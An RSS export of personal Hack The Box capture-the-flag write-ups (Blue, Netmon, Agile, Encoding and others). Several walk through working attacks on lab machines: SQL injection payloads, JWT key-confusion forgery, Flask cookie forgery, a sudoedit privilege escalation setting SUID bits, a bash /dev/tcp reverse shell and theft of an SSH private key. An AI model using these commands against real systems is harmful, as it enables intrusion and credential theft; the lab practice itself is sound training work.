<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title></title>
        <link>undefined</link>
        <description>undefined</description>
        <lastBuildDate>Mon, 13 Mar 2023 16:32:57 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>Joplin Pages Publisher</generator>
        <item>
            <title><![CDATA[Blue Challenge HTB]]></title>
            <guid>68ee7f67ab32448884535ae49fd5fe9d</guid>
            <pubDate>Sat, 11 Mar 2023 02:26:46 GMT</pubDate>
            <content:encoded><![CDATA[<p>We start with an nmap scan:<br />
nmap -Pn -sC -sV -oA nmap/initial 10.10.10.40<br />
<img src="/_resources/c2d6bc2c7fa64382b29c23824f8f67b8.png" /></p>
<p>We can see that this machine is running Windows 7 Pro 7601 Service Pack 1 which is vulnerable to Eternal Blue:<br />
<a title="https://www.exploit-db.com/exploits/42315" href="https://www.exploit-db.com/exploits/42315">https://www.exploit-db.com/exploits/42315</a></p>
<p>We attempted several non-metasploit methods, but all failed.</p>
<p>We try with metasploit.<br />
We succeed:<br />
<img src="/_resources/80f3dbf489874648990542dc1292f796.png" /><br />
We get the root.txt:<br />
<img src="/_resources/bc74d5bbbe7b4eb68b646e09b87fda8d.png" /><br />
1578f84c0aeb6640e8c6e3971e7b04ae</p>
<p>We get the user.txt:<br />
<img src="/_resources/ea2c68f4c1664f09a72f1afc237c8dae.png" /><br />
d0579736afe9a008cc472be7f89bfaa6</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Under Construction Challenge HTB]]></title>
            <guid>dfe46b5a7538417b947aa34c3c2051ee</guid>
            <pubDate>Fri, 10 Mar 2023 21:48:08 GMT</pubDate>
            <content:encoded><![CDATA[<p>We are able to download the files for this challange, and examine the back end of the website that is hosted on this machine. We download the files and see that this challenge requires us to hack the JWT. The token call an SQLite database to verify whether a user exists, and also we can see how the tokens are generated:<br />
<img src="/_resources/f5efe70db5aa4d24bb1d5de4caa14575.png" /></p>
<p>SQLite dbhelper.json<br />
<img src="/_resources/579920a1a3d84d66837547d9fb350846.png" /></p>
<p>The live site is simple:<br />
<a title="http://138.68.178.152:30596/auth" href="http://138.68.178.152:30596/auth">http://138.68.178.152:30596/auth</a><br />
<img src="/_resources/05336fee3cb3423cb9dae19ccd041921.png" /></p>
<p>We have the option to register, which will gives us a JWT<br />
We create an account banana:banana<br />
<img src="/_resources/b77ec300711e427c9f1319e713344f42.png" /><br />
We login:<br />
<img src="/_resources/00b699f64b83488e85b4e4ab89b95bc3.png" /></p>
<p>We visit <a title="https://jwt.io/" href="https://jwt.io/">https://jwt.io/</a> and see that the JWT gives us a public key:<br />
<img src="/_resources/d7a46dcc543e457e9283a1ac41710359.png" /></p>
<p>There is a vulnerability with JWT that uses the private key to generate a public key for verification. We can change the algorithm from SHA256 to HS256, and the application will be default to using the HS algorithm instead of the private key.<br />
<a title="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235</a><br />
We can use the following python script to forge a new token:<br />
<a title="https://gist.github.com/wulfgarpro/3e87ae77a7107a3e3a2453eb38a3de20" href="https://gist.github.com/wulfgarpro/3e87ae77a7107a3e3a2453eb38a3de20">https://gist.github.com/wulfgarpro/3e87ae77a7107a3e3a2453eb38a3de20</a></p>
<p>In addition, the DBHelper.js file has a SQL injection vulnerability since the $username variable is called directly into the function:<br />
<img src="/_resources/2a8a046e30b94490918391bfe00777a2.png" /></p>
<p>We can try to use the following tool to inject a value into the username field of the JWT token:<br />
<a title="https://github.com/ticarpi/jwt_tool" href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p>
<p>First we copy the public key from the token into a file locally. We can get the key in clean output by running jwt_tool.py with the token as a paramater:<br />
<img src="/_resources/51f477b0d9394803ae7404765277e064.png" /></p>
<p>We can use the -X for exploit flag with k flag since we know that this server is vulnerable to key confusion and the -pk flag since we have the public key saved.</p>
<p>python3 jwt_tool.py $(cat ../token) -I -pc username -pv "banana' and 1=1-- -" -X k -pk ../duplicate.key<br />
<img src="/_resources/c9e74c121e234a238fe73819d5e2481e.png" /><br />
We add a payload into the username:<br />
banana ' and 1=1-- -</p>
<p>And there are no errors, which means our injection works.<br />
<img src="/_resources/287517f7ea0641ea9dbfad4b06a9d9bd.png" /><br />
Let's try generating a payload that gives us some results.</p>
<p>We try some union select queries:<br />
' and 1=0 union select 111,sqlite_version(),333;--</p>
<p><img src="/_resources/5aff6aee718c453db7dd80546eaf83c3.png" /></p>
<p>We have injection.<br />
We can dump the database with the following injection:<br />
banana' AND 1=0 UNION SELECT 1,(SELECT group_concat(sql) FROM sqlite_master),3;--<br />
<img src="/_resources/15505b16d5b34aa383b7c787e7013c32.png" /></p>
<p>We can get the value by entering this value:</p>
<p>banana' AND 1=0 UNION SELECT 1,(SELECT group_concat(top_secret_flaag) FROM flag_storage),3;--</p>
<p><img src="/_resources/f6199b6ddae74cdaaf2463bb73a64a38.png" /><br />
HTB{d0n7_3xp053_y0ur_publ1ck3y}</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Netmon Challenge HTB]]></title>
            <guid>165b65c29f71478b95283e92955f519f</guid>
            <pubDate>Fri, 10 Mar 2023 20:59:01 GMT</pubDate>
            <content:encoded><![CDATA[<p>We start with an nmap scan:<br />
nmap -Pn -sC -sV -oA nmap/initial 10.10.10.152<br />
<img src="/_resources/44ccfbc499544d8c88faad4221f2ad78.png" /></p>
<p>This tells us that there is an ftp server with anonymous access.</p>
<p>The site on port 80 is a login portal for a network monitor:<br />
<img src="/_resources/66027e456eaf4938bf5998156d3a54d0.png" /></p>
<p>It appears that the contents of the ftp directory are web server files. We can login and see if we can find some credentials.</p>
<p>We login to the ftp server and are able to download the user.txt file:<br />
<img src="/_resources/0df1cfc48a504b048a9292050ded3d61.png" /></p>
<p>We look around a find some log files under the inetpub directory. We see a username:<br />
<img src="/_resources/b9b588fc1c6547b1a39c4a2569300023.png" /></p>
<p>We can also see that this software is running version 18.1.37:<br />
<img src="/_resources/c871af13ad274266aa399ab2fff86157.png" /></p>
<p>Apparently the PRTG config files are stored at this location:<br />
%programdata%\Paessler\PRTG Network Monitor</p>
<p>We navigate to this location via ftp and download the backup config file:<br />
<img src="/_resources/94dccae33bb24c939bed80c02c6b3a2b.png" /></p>
<p>We search for username or password and find a username:<br />
<img src="/_resources/9c3d2ae0b2af484e960160821c15c62a.png" /><br />
Then searching the document we find a password:<br />
<img src="/_resources/f9c79ad157b6458bb1ef7cf68df72d48.png" /><br />
prtgadmin:PrTg@dmin2018<br />
We change the 2018 to 2019 and we are able to login:<br />
<img src="/_resources/f9a15a5808db4196a531792f13d23ded.png" /><br />
We find an exploit for Authenticated RCE:<br />
<a title="https://www.exploit-db.com/exploits/46527" href="https://www.exploit-db.com/exploits/46527">https://www.exploit-db.com/exploits/46527</a></p>
<p>We run the exploit with the cookies from our login and the script creates a user named pentest with password P3nT3st!<br />
./46527.sh -u <a title="http://10.10.10.152" href="http://10.10.10.152">http://10.10.10.152</a> -c "_ga=GA1.4.769301708.1678482064; _gid=GA1.4.941712534.1678482064; OCTOPUS1813713946=e0U4QTQyMjZGLTk2QzMtNEE4RC1BQkMyLTJCQTRBQkMwQThCRH0%3D"<br />
<img src="/_resources/a08faf6af23c43d9b7932d0f73020f93.png" /></p>
<p>Next we run impacket-psexec and get a shell:<br />
impacket-psexec pentest:P3nT3st!@10.10.10.152<br />
We get the root.txt:<br />
<img src="/_resources/d8ab4c27c25b40938b15084ad705b90b.png" /></p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[TwoForOne Challenge]]></title>
            <guid>7866a73efa1541ea92630e0c1bb204ed</guid>
            <pubDate>Wed, 08 Mar 2023 22:56:23 GMT</pubDate>
            <content:encoded><![CDATA[<p>We Download the files and then use the RsaCtfTool to dump the keys:<br />
python3 RsaCtfTool.py --publickey ../../TwoForOne/key1.pem --dumpkey<br />
<img src="/_resources/a6c53042ca0f4797b2a31134a651781f.png" /></p>
<p>python3 RsaCtfTool.py --publickey ../../TwoForOne/key2.pem --dumpkey<br />
<img src="/_resources/046b944628664805a4d04460786abe9a.png" /></p>
<p>n represents the modulus for the public and private keys<br />
e represents the public key exponent</p>
<p>Both n values are equal between the two keys which is strange.<br />
This means the key is vulnerable to a Common Modulus Attack. Someone wrote a script for this:<br />
<a title="https://github.com/HexPandaa/RSA-Common-Modulus-Attack" href="https://github.com/HexPandaa/RSA-Common-Modulus-Attack">https://github.com/HexPandaa/RSA-Common-Modulus-Attack</a></p>
<p>python3 rsa-cm.py -c1 ../message1 -c2 ../message2 -k1 ../key1.pem -k2 ../key2.pem<br />
We run the script and get the flag:<br />
<img src="/_resources/b601306260ce4436b48d1ba2ff36ea36.png" /><br />
HTB{C0mmon_M0dUlu5S_1S_b4D}</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[You Know 0xDiablos]]></title>
            <guid>d3f0ed6c2fea4b588e381931bebc64d2</guid>
            <pubDate>Wed, 08 Mar 2023 21:18:07 GMT</pubDate>
            <content:encoded><![CDATA[<p>We download the file and unzip using 7z x</p>
<p><img src="/_resources/c167acf659a1479eba399fc6216da8ad.png" /></p>
<p>We run file against the vuln file and see that it is a 32bit ELF:<br />
<img src="/_resources/b5ef8cd44584495a898899260062bd11.png" /><br />
We spawn the machine to see what we need to do and we see this ip address.</p>
<p>142.93.45.159:31277</p>
<p>We run an nmap scan to see if we can learn anything:<br />
nmap -Pn -sC -sV -p 31277 -oA initial 142.93.45.159<br />
This is unusual output:<br />
<img src="/_resources/3990db98bb3545dab559cf9115645718.png" /></p>
<p>I assume this a BOF challenge.</p>
<p>Since it's our first day, and we don't know what to do we follow someone's writeup:<br />
<a title="https://shakuganz.com/2021/06/08/hackthebox-you-know-0xdiablos-write-up/" href="https://shakuganz.com/2021/06/08/hackthebox-you-know-0xdiablos-write-up/">https://shakuganz.com/2021/06/08/hackthebox-you-know-0xdiablos-write-up/</a></p>
<p>We use ghidra to analyze the binary:<br />
<img src="/_resources/4026937b606e429fb427f68865d81f0e.png" /></p>
<p>We find the vuln() call in the binary:<br />
<img src="/_resources/79f9e31bd8314a5ea964cedb1689bcd9.png" /></p>
<p>We use the security checker script here to view the security methods of the vuln binary:<br />
<a title="https://github.com/slimm609/checksec.sh" href="https://github.com/slimm609/checksec.sh">https://github.com/slimm609/checksec.sh</a><br />
<img src="/_resources/73501fdb93954dff92e47dc39f3d15b8.png" /></p>
<p>Then we run the python command to overflow the buffer with A's as a check:<br />
python3 -c "print('A'* 200)" | ./vuln<br />
<img src="/_resources/7678972c5bb54b8a8b0a30db07f56ed5.png" /></p>
<p>Using gdb we can run the file and then get info about what happens when it runs:<br />
We run with the command:<br />
gdb ./vuln<br />
then enter r<br />
we use ctrl+c to end the run and the type info file to see the ouput<br />
<img src="/_resources/d9798bdb5ba94b4a8a32aceaf93a2255.png" /></p>
<p>We can see that the entry point is<br />
Entry point: 0x80490d0</p>
<p>We can see that this function is where the program starts:<br />
<img src="/_resources/c638d16607bd41fdb53819baa93af2f8.png" /></p>
<p>We would need to set break points before and after the get() function within the vuln() function to make sure that we can control the overlow:<br />
<img src="/_resources/830dc8ae0e12409c90fbd89af7738074.png" /></p>
<p>We set breakpoints in gdb by using b * point<br />
b *0x08049291<br />
b *0x08049296<br />
<img src="/_resources/6e2be14388da4f74a6deb6aa6fb2e53e.png" /></p>
<p>According to the walkthrough we<br />
When we analyze the stack using the command “x/60x $esp” we can see the return address of vuln() located at 0xffffd0cc on the stack<br />
<img src="/_resources/129b1de54dc94bf1894a73a100c6d242.png" /></p>
<p>The return address can be proven by comparing it with the next instruction in main() after calling vuln() as shown:<br />
<img src="/_resources/0ba7262143f84855bc19bc8da8f40b0c.png" /></p>
<p>Just as in the walkthrough we unput 184 A's and find that we need 4 more A's to reach the main function:<br />
<img src="/_resources/e8774c47d90145faab960cce20d077e5.png" /></p>
<p>Previously noting the flag() function which prints out the flag, a buffer overflow script can be written according to what's found in the walkthrough.<br />
<img src="/_resources/ed4a55feb2154322ad700426cd51f819.png" /></p>
<p>We run the testexploit.py file we created and get a message:<br />
<img src="/_resources/51079504c4a5466b979131d99f5974b5.png" /></p>
<p>When looking at the flag() function in the binary, we see that two paramters are needed:<br />
<img src="/_resources/0af67f31bf824689bbf599ea36083d76.png" /><br />
The binary specifies what the values should be in the paramters:<br />
<img src="/_resources/ffc1deb6fa2340b6a2b995f637b92b13.png" /></p>
<p>0xdeadbeef<br />
0xc0ded00d</p>
<p>We need to modify the exploit to pass those parameters:<br />
<img src="/_resources/a81972aff8534039b9c3b5868a81628e.png" /></p>
<p>We create a flag.txt file and test it:<br />
<img src="/_resources/1ee4ac766dd641fba0d77d0a73d3a354.png" /></p>
<p>Now we modify the exploit for interacting with server:<br />
<img src="/_resources/61a98a6e74b249e79cd00467f2c651be.png" /></p>
<p>We got the flag:<br />
<img src="/_resources/11edad27330b4b8ab613d32d6ed462c1.png" /><br />
HTB{0ur_Buff3r_1s_not_healthy}</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Jerry HTB]]></title>
            <guid>12622682500b4f81be37f1d8de5b9de6</guid>
            <pubDate>Wed, 08 Mar 2023 17:15:37 GMT</pubDate>
            <content:encoded><![CDATA[<p>We strart with nmap:<br />
nmap -Pn -sC -sV -oA nmap/initial 10.10.10.95<br />
<img src="/_resources/a51ca88c13bd480a846daad730643871.png" /></p>
<p>We see port 8080 is open and is a web server<br />
There is a manager application on this tomcat server we can log into:<br />
<img src="/_resources/ff7800ce0757433595943383181a1d66.png" /><br />
I failed login attempts and blacklisted our ip:<br />
womp womp.</p>
<p>We can see that there is an RCE exploit for this version of Tomcat:<br />
<a title="https://www.exploit-db.com/exploits/42953" href="https://www.exploit-db.com/exploits/42953">https://www.exploit-db.com/exploits/42953</a></p>
<p>We are unable to login through the browser for some reason, but there is a metasploit module for this exploit:<br />
exploit(multi/http/tomcat_mgr_upload</p>
<p>We verify we have the correct credentials using another msf module:<br />
auxiliary(scanner/http/tomcat_mgr_login</p>
<p><img src="/_resources/43a09f4e6a724d17baba54c99954b567.png" /><br />
We run the metasploit module:<br />
<img src="/_resources/82f7de5a404f41c1a9b3b51b094db342.png" /></p>
<p>Then we get the flags:<br />
<img src="/_resources/24d8ee77cd8942cabf6ece2547591f9d.png" /></p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Agile Seasonal HTB]]></title>
            <guid>a996da166e4b4d0e8c4a4229bf758a7c</guid>
            <pubDate>Wed, 08 Mar 2023 04:24:45 GMT</pubDate>
            <content:encoded><![CDATA[<p>We start with nmap:<br />
nmap -sC -sV 10.129.175.128</p>
<p><img src="/_resources/2986101f5e234026aace7817bb09fa2b.png" /></p>
<p>We do a banner grab:<br />
<img src="/_resources/63038d002e314d0dae9a154bd4325ae7.png" /><br />
We add superpass.htb to our /etc/hosts file</p>
<p>We run a full scan in the backgound:<br />
nmap -sC -sV -p- 10.129.175.128</p>
<p>Looks like a password manager service:<br />
<img src="/_resources/ad02c2b5ef2243f6b31d4f7e6386ab6b.png" /><br />
There is a login page<br />
<img src="/_resources/e41c3d0926124a9a9482ce3937772ef4.png" /></p>
<p>We attempt to login as admin:admin but get a mysql error:<br />
<img src="/_resources/10964ffa9bc8470cb17792e32303ce46.png" /></p>
<p>We may have interrupted to the packet transfer and gotten this error, but it is useful since it gives us information about the backend. For instance, this error is a Werkzeug error, and we also see that the server is running python.<br />
<img src="/_resources/b0e2ce48bd4c44f78a948d060e8d0170.png" /></p>
<p>We attempt to register an account banana:banana</p>
<p><img src="/_resources/227975f55ca24f30a3069eef31fff50c.png" /><br />
Similarly we get an error:<br />
<img src="/_resources/3f034451667d47e6b3e70afc27865409.png" /></p>
<p>We can try some error based sql injection since we know that it's running MySQL</p>
<p>We attempt to register with admin:admin‘ or 1=1    --+ and are able to create an account:<br />
<img src="/_resources/0fa7c6d73c3140dc9e6fcb59d0195d9d.png" /></p>
<p>We are able to add values and then the export function allows us to download files from the server with the values we put in.<br />
<img src="/_resources/232064274caf468c8678e4104af5aa16.png" /></p>
<p>The error gives us interesting information about where the server is sending us files from:<br />
<img src="/_resources/8b68be499b36438082a41808279fc66e.png" /></p>
<p>We intercept the download in use lfi to leak /app/app/superpass/app.py<br />
<img src="/_resources/c3187543c385497181f05c3b42f01f45.png" /></p>
<p>From there we can use the secret_key to generate cookies for other users. We use flask-unsign to decode our cookie:<br />
<a title="https://github.com/Paradoxis/Flask-Unsign" href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a></p>
<p>flask-unsign --decode --cookie '.eJwljsFqwzAQRH9F7DkUSSvvav0VvZcQ1tIqNrhNsZxTyL9X0NMwvGF4L7i1XftqHeavF7hzBHxb73o3uMDnbtrN7Y-7237c-XBayoDuXLfufsfmA67v62WcHNZXmM_jaaNtFWZgREP0ylbEKpmmmBDFB2mMlLilFiMGqSoyaONMOUSORSPpotWYCqsoikplzySpUsuNfJTiU8rRQuZlqpITYdaJsHGYfKS6SBEa-rdnt-PfJnh4_wHiAEU2.ZAgWLw.2o-0IlG16ViEhEqNrPqLtxHyKH0' --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD</p>
<p><img src="/_resources/8ca900b4bbda413090b84833cf068ec4.png" /></p>
<p>Then we use flask-unsign to generate other cookies for users with different id #<br />
flask-unsign --sign --cookie "{'_flashes': [('message', 'Please log in to access this page.')], '_fresh': True, '_id': '49db19ffeb8d7784424fd0cc587cadaa6adf43aab766b45eb9155904a9a356c64f0598e29fa68221cc2e9939547fe9069d5a87e1a6f68632da8a04915785097c', '_user_id': 'change this number to find'}" --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD</p>
<p>User 1<br />
<img src="/_resources/296e5c5ca4484056a50ccd62fd3f1dfd.png" /></p>
<p>User 2<br />
<img src="/_resources/b017177e4f3340ec9b8acb3cbae9fde7.png" /></p>
<p>we can try these creds to ssh into the machine:<br />
corum:5db7caa1d13cc37c9fc2<br />
We try<br />
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" corum@superpass.htb<br />
We get the user.txt<br />
<img src="/_resources/d7108acdcafa47b38d0b47089b1e4596.png" /><br />
fe91ffb289d0e4448607ab6a20def12a</p>
<p>In the box we see some internal ports listening:<br />
<img src="/_resources/3a0003e1257d42c189d40060f385c6a4.png" /><br />
There are also two other users on the machine:<br />
<img src="/_resources/b905980b8f0f4b40b5a9305af3d71793.png" /></p>
<p>We navigate the the /app directory and see some interesting files. We look at the test_and_update.sh script:<br />
<img src="/_resources/7df14884f054413c83501169807c57c6.png" /><br />
We have write permissions in the /app/app directory:<br />
<img src="/_resources/1f9844eba681432b8b21eb3f9b162c4f.png" /></p>
<p>ps aux shows us that chrome is running with --remote-debuggin-port flag which means we may be able to connect to this service from our machine:<br />
<img src="/_resources/c0d8dfd7954d4c4f889a039b0eb708d1.png" /></p>
<p>There is also a test app running on two ports that we can potentially port forward and connect to locally.<br />
<img src="/_resources/375b64d21bdd473aa11a3806a041cb5e.png" /></p>
<p>We try port forwarding the first unusual port 41829<br />
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" corum@superpass.htb -L 41829:127.0.0.1:41829</p>
<p>We verify that our port forward worked:<br />
<img src="/_resources/0a372eb0d73a4181861569421413c98a.png" /></p>
<p>First we need to install chrome, and then we can attempt to open this port manually:<br />
We type chrome://inspect<br />
<img src="/_resources/3e3a6ce61ad449cbb98ead979537cc3e.png" /><br />
We configure the browser to use port 41829<br />
<img src="/_resources/a3361949ef3a4cc08571c98793587c2f.png" /></p>
<p>We see a page called test.superpass.htb:<br />
<img src="/_resources/65cdb78ad5524963a7f6daa8f8eb4a3f.png" /></p>
<p>We go to the vault page and see credentials for the user edwards:<br />
<img src="/_resources/33683de156534480a30064f0b55b8ec1.png" /></p>
<p>edwards:d07867c6267dcb5df0af<br />
We can ssh into that user's account now:<br />
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" edwards@superpass.htb</p>
<p>Edwards has sudo rights:<br />
<img src="/_resources/984ee81961b245e388e276f5fa0f423f.png" /></p>
<p>We run the first command and find creds:<br />
<img src="/_resources/cf5dcf3f77da48c2b691db510a7c82ef.png" /><br />
edwards:1d7ffjwrx#$d6qn!9nndqgde4</p>
<p>We run the second sudo command:<br />
<img src="/_resources/6397996c16324bea8a4f15cc55880a96.png" /><br />
"SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"</p>
<p>We run pspy64 to see what the root user is doing to search for clues on how to exploit the sudoedit function.</p>
<p>The root user is running /app/venv/bin/activate every other minute:<br />
<img src="/_resources/4ebae6cb95a54d06a7e1bde07fe9faca.png" /><br />
We can see that the root user and dev_admin user can both write to this file:<br />
<img src="/_resources/1778bdc0e11b46bfb6c3b3eef4b24c43.png" /></p>
<p>Apparently this machine requires us to exploit a new vulnerability with this version of sudo:<br />
CVE-2023-22809<br />
<a title="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf" href="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf">https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf</a></p>
<p><img src="/_resources/ee7fcd631cf4406d9fac9b35919e8d4b.png" /></p>
<p>This vulnerability will allow us to change an environment variable to a path and then edit the file that is meant to run.</p>
<p>First we change the environment variable:<br />
export EDITOR='vim -- /app/venv/bin/activate'</p>
<p>Then we edit one of the files we can edit using sudoedit by adding the following at the top:<br />
chmod u+s /usr/bin/python3</p>
<p>chmod u+s /bin/bash<br />
<img src="/_resources/90914bf4c32a4dc1973101e44c33a3da.png" /></p>
<p>We can see that the file was changed, and now we wait to check if the suid bit is set:<br />
ls -l /usr/bin/python3.10<br />
<img src="/_resources/2aebcb5c89c64b4080c1a8b188a72999.png" /></p>
<p>Now we run the following commands to get a root shell:<br />
python3 -q<br />
import os<br />
os.setuid(0)<br />
os.system("su")<br />
<img src="/_resources/c99d7f6240174e96afc493879b51519c.png" /><br />
d53631abda604773de0ed8c5d685865b</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[HTB Encoding]]></title>
            <guid>08cbade22b5e4006a3f49965a42f4dec</guid>
            <pubDate>Tue, 07 Mar 2023 00:55:30 GMT</pubDate>
            <content:encoded><![CDATA[<p>We start with an nmap scan:<br />
nmap -sC -sV -oA nmap/initial 10.10.11.198<br />
<img src="/_resources/297f150831eb49d48fea8b4716e16c5d.png" /></p>
<p>Then we run a full scan:<br />
nmap -sC -sV -p- -oA nmap/ful 10.10.11.198<br />
<img src="/_resources/737a829dfd1b4379a81322d2db939300.png" /></p>
<p>No additional TCP ports are open</p>
<p>We do a banner grab for the port 80:<br />
<img src="/_resources/06311292fc214626b1c65c49deb72757.png" /></p>
<p>The site on the port 80 is called Hax Tables.</p>
<p>The first thing that grabs our eye is the API tab:<br />
<img src="/_resources/f5babc4601be4dc4b17c221e4c3f57f5.png" /></p>
<p>We check out the Conversions page.<br />
The conversions page has a form that we can use:<br />
<img src="/_resources/cc7a5d5f4d8c4d7f99d7eba4148d9c65.png" /></p>
<p>We intercept a request to the form and see handler.php:<br />
<img src="/_resources/47e2bc2ec6a34321a9a0960e587af70b.png" /></p>
<p>The API page gives us another subdomain. So we'll add both haxtables and api.haxtables.htb to /etc/hosts</p>
<p><img src="/_resources/e7d25efb56584eb5901de30bd8199462.png" /></p>
<p>The API site also gives us some python scripts to work with.<br />
<img src="/_resources/ce6f9ac939c4444dbc2c91ee42e657aa.png" /></p>
<p>If we modify them, we can likely get LFI.</p>
<p>We also know that that v1 of the API url is also running, but version 2 says it has a security flaw:<br />
<img src="/_resources/9332953de6b24010a281a20ffee14b63.png" /><br />
<img src="/_resources/aefa67c36d864d2caf1244cbfa91761b.png" /></p>
<p>Let's see if we can modify the python scripts we have to get LFI:<br />
<img src="/_resources/6e1827e8cba14f519bc9c04d7bcc3c36.png" /></p>
<p>We have lfi:<br />
<img src="/_resources/51e659023602414196b8b48ad1083fa4.png" /></p>
<p>We see that there is a third subdomain images.haxtables.htb:<br />
<img src="/_resources/2039a941eae14c0b97d53031b7b289fd.png" /></p>
<p>We look to see if we can read the page from the /var/www/image/ folder since we cannot access it by browser:<br />
<img src="/_resources/98e0798066614a839207ab37b7a3aadd.png" /></p>
<p>We then load the utils.php file:<br />
<img src="/_resources/5d995f6e199c45578d1bc565bfc5b8c9.png" /></p>
<p>We can see some git commands with shell_exec functions and a git-commit.sh script.<br />
Reading that file gives us a username:<br />
<img src="/_resources/e2f703d2d01f4142b739c4c4b0c8197c.png" /></p>
<p>We can see that there is a .git directory.<br />
We try searching common files found in this directory but find nothing useful.<br />
However, someone made a script specifically for this machine to download the files from this .git directory:<br />
<a title="https://gist.github.com/EmmanuelCruzL/e309615e2951079e25b8bba7a13e8385" href="https://gist.github.com/EmmanuelCruzL/e309615e2951079e25b8bba7a13e8385">https://gist.github.com/EmmanuelCruzL/e309615e2951079e25b8bba7a13e8385</a></p>
<p>It is a modified version of this script:<br />
<a title="https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh" href="https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh">https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh</a></p>
<p>We run: ./gitdumper.sh  <a title="http://image.haxtables.htb/.git/" href="http://image.haxtables.htb/.git/">http://image.haxtables.htb/.git/</a> image<br />
The script runs and we see many files downloaded, but cannot interact with them:<br />
<img src="/_resources/93cf68dfa1934cdfa4b34e91ed54f2ef.png" /></p>
<p>We can run git show:<br />
<img src="/_resources/13c09d36556c407abd770826a98622cc.png" /></p>
<p>There is a tool to visualize a git repository using GUI that is free:<br />
<a title="https://www.gitkraken.com/" href="https://www.gitkraken.com/">https://www.gitkraken.com/</a></p>
<p>We are able to open the repo in gitkraken:<br />
<img src="/_resources/3001aa19809f44cd808735ee8f84134e.png" /></p>
<p>We see the file action_handler.php<br />
<img src="/_resources/72e43dba99db4638b85835fd024b662f.png" /></p>
<p>This has a GET request which is vulnerable to lfi that uses a page variable. from the utils.php file.</p>
<p>We examine the handler.php file we found through the web form to see if we can exploit this somehow:<br />
<img src="/_resources/56c654a1817149be97c492e2e29de97f.png" /></p>
<p>The POST is sent via utils.php and evaluates the 'data_file' paramater and gives it a 'tmp_name'</p>
<p>The application stores the $action, $data, $uri_path, and $is_file variables.<br />
The variables that are stored are passed through the make_api_call() function. This code is also vulnerable to SSRF because there is no filtering on what data or files are input into the form.<br />
All we need to do is pass the following variables in the json fields of the post:</p>
<p>{"action":"","data":"","uri_path":":banana@image.haxtables.htb/actions/action_handler.php?page=/etc/passwd&amp;"}<br />
<img src="/_resources/36f4cc0e557f4106adcc8dcbd1511ad4.png" /></p>
<p><img src="/_resources/3da3a21164b44a72b822a393a1202c17.png" /></p>
<p>Based on these findings, we can use PHP filters chain which is a technique in PHP that allows an attacker to create a chain of filters that processes and transforms input data. This technique can be used to achieve an interactive shell.</p>
<p>Here is an artcile explaining why this works in detail:<br />
<a title="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html" href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html">https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html</a></p>
<p>Someone built a tool to essentially turn LFI into RCE or make a reverse shell using php filter chains:<br />
<a title="https://github.com/synacktiv/php_filter_chain_generator" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
<p>We use the tool to generate a chain for us that sends us a reverse shell througj bash:<br />
python3 php_filter_chain_generator.py --chain "&amp; /dev/tcp/10.10.14.2/443 0&gt;&amp;1\"');?&gt;"<br />
<img src="/_resources/db82b5a48f83459196f48d554d9a9e9f.png" /></p>
<p>We add the chain at the end of the uri_path page paramater:<br />
<img src="/_resources/ac80dc373cef456f825ea119fb88eabf.png" /></p>
<p>We open a nc listener and see what happens:<br />
<img src="/_resources/53dcc1f36f734edc905746a6ccd32726.png" /><br />
We learn from uname -a:<br />
Linux encoding 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</p>
<p>We run sudo -l and see that we have permission to run the git-commit.sh file that we saw earlier.<br />
<img src="/_resources/3c3b1f15aa004ecdbdb699f3f70ac2ef.png" /></p>
<p>We will have to modify the contents of the git push and can probably get the user's credentials.</p>
<p>We can create a script that executes in order to copy the ssh key of the user into a file in the /dev/shm directory:<br />
echo "cat ~/.ssh/id_rsa &gt; /dev/shm/key" &gt; /tmp/readkey</p>
<p>In the directory /var/www/image we abuse the ident filter so that when executing the script the readkey that we create is executed:</p>
<p>We run the following commands:<br />
git init<br />
echo '*.php filter=indent' &gt; .git/info/attributes<br />
git config filter.indent.clean /tmp/readkey<br />
sudo -u svc /var/www/image/scripts/git-commit.sh</p>
<p><img src="/_resources/590adb4639b141e892d84579884ab6ba.png" /></p>
<p>The key file was created in /dev/shm:<br />
<img src="/_resources/d07cccab91bc48739ee0fc572cc94482.png" /></p>
<p>We can copy the key to our machine and then ssh into the box using the svc user.<br />
